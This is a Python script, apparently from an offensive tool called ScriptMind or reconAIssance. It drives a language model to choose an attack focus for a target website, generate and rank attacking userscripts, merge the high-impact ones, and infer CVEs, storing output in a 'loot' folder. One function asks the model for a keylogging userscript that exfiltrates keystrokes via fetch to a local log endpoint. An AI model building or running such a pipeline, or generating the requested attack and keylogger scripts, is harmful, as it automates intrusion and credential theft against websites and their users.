import os
import sys
import json
import re
import zipfile
import logging
from datetime import datetime
from pathlib import Path
from threading import Thread
from playwright.sync_api import sync_playwright

# Setup logger
logger = logging.getLogger("reconAIssance")
logger.setLevel(logging.DEBUG)
if not logger.hasHandlers():
    formatter = logging.Formatter("%(asctime)s [%(levelname)s] %(message)s")
    fh = logging.FileHandler("recon_log.txt", mode="a")
    fh.setFormatter(formatter)
    logger.addHandler(fh)
    ch = logging.StreamHandler()
    ch.setFormatter(formatter)
    logger.addHandler(ch)

sys.path.insert(0, os.path.abspath(os.path.join(os.getcwd(), "tools")))
from llm_wrapper import use_llm
from superscript_cve_infer import run as infer_cves_from_class

COUNT = int(os.getenv("RECON_SM_COUNT", "5"))
ITER = int(os.getenv("RECON_SM_ITER", "2"))
CACHE_FILE = "tools/scriptmind_cache.json"

def load_cache():
    if os.path.exists(CACHE_FILE):
        return json.load(open(CACHE_FILE))
    return {}

def save_cache(cache):
    with open(CACHE_FILE, "w") as f:
        json.dump(cache, f, indent=2)

def start_superscript_server(run_path):
    logger.debug("Starting internal HTTP server for superscripts")
    os.chdir(run_path)
    Thread(target=lambda: os.system("python3 -m http.server 8080"), daemon=True).start()

def select_focus_mode(target, run_path):
    logger.info(f"Selecting focus mode for: {target}")
    prompt = f"""Choose an attack focus for the website: https://{target}.

ONLY RETURN VALID JSON. Example:
{{"focus_mode": "xss", "reason": "Site likely vulnerable to XSS"}}
"""
    result = use_llm("focus_selection", prompt)
    try:
        parsed = json.loads(result.strip().split("\n")[-1])
        logger.info(f"Focus mode selected: {parsed}")
        return parsed
    except json.JSONDecodeError:
        logger.warning("Failed to parse focus mode from LLM")
        return {"focus_mode": "full", "reason": "LLM parse error"}

def generate_script_batch(target, focus_mode, run_path, count):
    logger.debug(f"Generating {count} superscripts with focus: {focus_mode}")
    scripts = []
    for i in range(count):
        prompt = f"""Create a Violentmonkey-compatible userscript targeting https://{target} with attack focus '{focus_mode}'.

ONLY RETURN THE USERSCRIPT CODE. No explanations."""
        content = use_llm("script_generation", prompt)
        name = f"gen_{i+1}_{datetime.now().strftime('%H%M%S')}.user.js"
        full_path = os.path.join(run_path, name)
        with open(full_path, "w") as f:
            f.write(content)
        scripts.append({"name": name, "path": full_path, "content": content})
        logger.info(f"Generated userscript: {name}")
    return scripts

def evaluate_superscript(script_path, target, run_path):
    logger.debug(f"Evaluating script: {script_path}")
    try:
        script_content = Path(script_path).read_text()
    except Exception as e:
        logger.warning(f"Could not read script: {e}")
        return

    prompt = f"""Evaluate the effectiveness and potential vulnerabilities triggered by this userscript on https://{target}.

Script:
{script_content[:3000]}

ONLY RETURN VALID JSON. Example:
{{"effect": "high", "class": "xss", "module": ["exploit/..."], "note": "Cross-site scripting detected."}}
"""
    result = use_llm("script_evaluation", prompt)
    try:
        parsed = json.loads(result.strip().split("\n")[-1])
        logger.info(f"Script classified: {parsed}")
    except json.JSONDecodeError:
        parsed = {
            "effect": "unknown",
            "class": "unknown",
            "module": [],
            "note": f"LLM parse error: {result[:200]}"
        }
        logger.warning("Failed to parse LLM script evaluation")

    # Neu: Klassifikation in Liste eintragen
    all_file = os.path.join(run_path, "superscript_class_all.json")
    if os.path.exists(all_file):
        try:
            all_data = json.load(open(all_file))
        except Exception:
            all_data = []
    else:
        all_data = []

    parsed["script"] = os.path.basename(script_path)
    all_data.append(parsed)

    with open(all_file, "w") as f:
        json.dump(all_data, f, indent=2)

    # Alte Datei bleibt als letzter Eintrag erhalten (für Kompatibilität)
    class_file = os.path.join(run_path, "superscript_class.json")
    with open(class_file, "w") as f:
        json.dump(parsed, f, indent=2)

    if parsed["effect"] in ["high", "medium"]:
        logger.info("High-impact script detected → inferring CVEs")
        infer_cves_from_class(target, run_path)

def run_scriptmind_loop(target, run_path):
    logger.info(f"Running ScriptMind for target: {target}")
    cache = load_cache()

    focus_data = select_focus_mode(target, run_path)
    focus = focus_data.get("focus_mode", "full")

    cache_key = f"{target}_{focus}"
    if cache_key in cache:
        logger.info("Using cached ScriptMind result.")
        return

    all_scripts = []
    for i in range(ITER):
        batch = generate_script_batch(target, focus, run_path, COUNT)
        for script in batch:
            evaluate_superscript(script["path"], target, run_path)
            all_scripts.append(script["path"])

    cache[cache_key] = {"scripts_tested": all_scripts, "timestamp": str(datetime.now())}
    save_cache(cache)

    start_superscript_server(run_path)

    try:
        # Versuch über vollständige Datei
        all_file = os.path.join(run_path, "superscript_class_all.json")
        if os.path.exists(all_file):
            with open(all_file) as f:
                all_classes = json.load(f)
            effects = [entry.get("effect") for entry in all_classes]
            if all(e in ["low", "unknown", "neutral"] for e in effects):
                logger.info("Low-impact classification only – retrying ScriptMind with new focus")
                run_scriptmind_loop(target, run_path)
    except Exception:
        logger.warning("Could not analyze overall impact – skipping retry")

def zip_all_superscripts():
    zip_name = f"superscripts_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
    zip_path = os.path.join("loot", zip_name)
    try:
        with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as z:
            for root, _, files in os.walk("loot"):
                for file in files:
                    if file.startswith("superscript_") and file.endswith(".user.js"):
                        full = os.path.join(root, file)
                        z.write(full, arcname=os.path.relpath(full, "loot"))
        logger.info(f"Superscripts archived to: {zip_path}")
    except Exception as e:
        logger.exception("Failed to archive superscripts")

def rate_generated_scripts(run_path):
    logger.info("Generating ScriptMind ranking...")
    all_file = os.path.join(run_path, "superscript_class_all.json")
    if not os.path.exists(all_file):
        logger.warning("No classification data found.")
        return

    try:
        entries = json.load(open(all_file))
    except Exception as e:
        logger.warning("Failed to load all classifications.")
        return

    html = [
        """<html><head><meta charset='utf-8'><title>Ranking</title>
        <link href='https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css' rel='stylesheet'></head>
        <body><div class='container'><h2>ScriptMind Ranking</h2><table class='table'>
        <thead><tr><th>Script</th><th>Effect</th><th>Class</th><th>Note</th></tr></thead><tbody>"""
    ]
    for entry in sorted(entries, key=lambda x: x.get("effect", ""), reverse=True):
        html.append(f"<tr><td>{entry.get('script')}</td><td>{entry.get('effect')}</td><td>{entry.get('class')}</td><td>{entry.get('note')}</td></tr>")
    html.append("</tbody></table></div></body></html>")

    ranking_path = os.path.join(run_path, "scriptmind_ranking.html")
    try:
        with open(ranking_path, "w") as f:
            f.write("".join(html))
        logger.info(f"ScriptMind Ranking created: {ranking_path}")
    except Exception as e:
        logger.exception("Failed to write ScriptMind ranking")

def combine_superscripts():
    logger.info("Combining high-impact superscripts...")
    paths = []
    for js in Path("loot").glob("**/superscript_*.user.js"):
        class_file = js.parent / "superscript_class_all.json"
        if not class_file.exists():
            continue
        try:
            all_data = json.load(open(class_file))
            if any(d.get("script") == js.name and d.get("effect") in ["high", "medium"] for d in all_data):
                paths.append(js)
        except Exception as e:
            logger.warning(f"Failed to parse class for {js.name}: {e}")

    if not paths:
        logger.warning("No high-impact superscripts found for combination.")
        return

    snippets = [Path(p).read_text()[:600] for p in paths[:5]]
    prompt = "Combine the following Superscripts into one robust version:\n\n" + "\n\n".join(snippets)

    try:
        response = use_llm("superscript_fusion", prompt)
        name = f"superscript_combo_{datetime.now().strftime('%Y%m%d_%H%M%S')}.user.js"
        combo_path = os.path.join("loot", name)
        with open(combo_path, "w") as f:
            f.write(response)
        logger.info(f"Combined superscript saved to: {combo_path}")
    except Exception as e:
        logger.exception("Failed to combine superscripts")

def webexfil_trigger(run_path, target):
    logger.info("Checking for WebExfil trigger conditions...")
    all_file = os.path.join(run_path, "superscript_class_all.json")
    if not os.path.exists(all_file):
        logger.debug("No classification data found – skipping WebExfil.")
        return
    try:
        all_data = json.load(open(all_file))
        for entry in all_data:
            if entry.get("class") == "tracking":
                break
        else:
            logger.debug("No tracking-classified scripts – skipping WebExfil.")
            return
    except Exception as e:
        logger.warning(f"Failed to read classification file: {e}")
        return

    prompt = """Generate a userscript that logs keystrokes and exfiltrates data via fetch to http://localhost:8080/log.php.

ONLY RETURN USERSCRIPT CODE."""

    try:
        code = use_llm("webexfil_script", prompt)
        name = f"webexfil_{datetime.now().strftime('%H%M%S')}.user.js"
        path = os.path.join(run_path, name)
        with open(path, "w") as f:
            f.write(code)
        logger.info(f"WebExfil script saved: {name}")
    except Exception as e:
        logger.exception("WebExfil script generation failed")

if __name__ == "__main__":
    target = os.getenv("RECON_KI_TARGET")
    run_path = os.getenv("RECON_KI_RUN_PATH")
    if not target or not run_path:
        logger.error("Missing RECON_KI_TARGET or RECON_KI_RUN_PATH")
        exit(1)

    run_scriptmind_loop(target, run_path)

    if os.getenv("RECON_SM_RANK"):
        rate_generated_scripts(run_path)

    if os.getenv("RECON_SM_COMBINE"):
        combine_superscripts()

    if os.getenv("RECON_SM_WEBEXFIL"):
        webexfil_trigger(run_path, target)

    if os.getenv("RECON_SM_ZIP"):
        zip_all_superscripts()

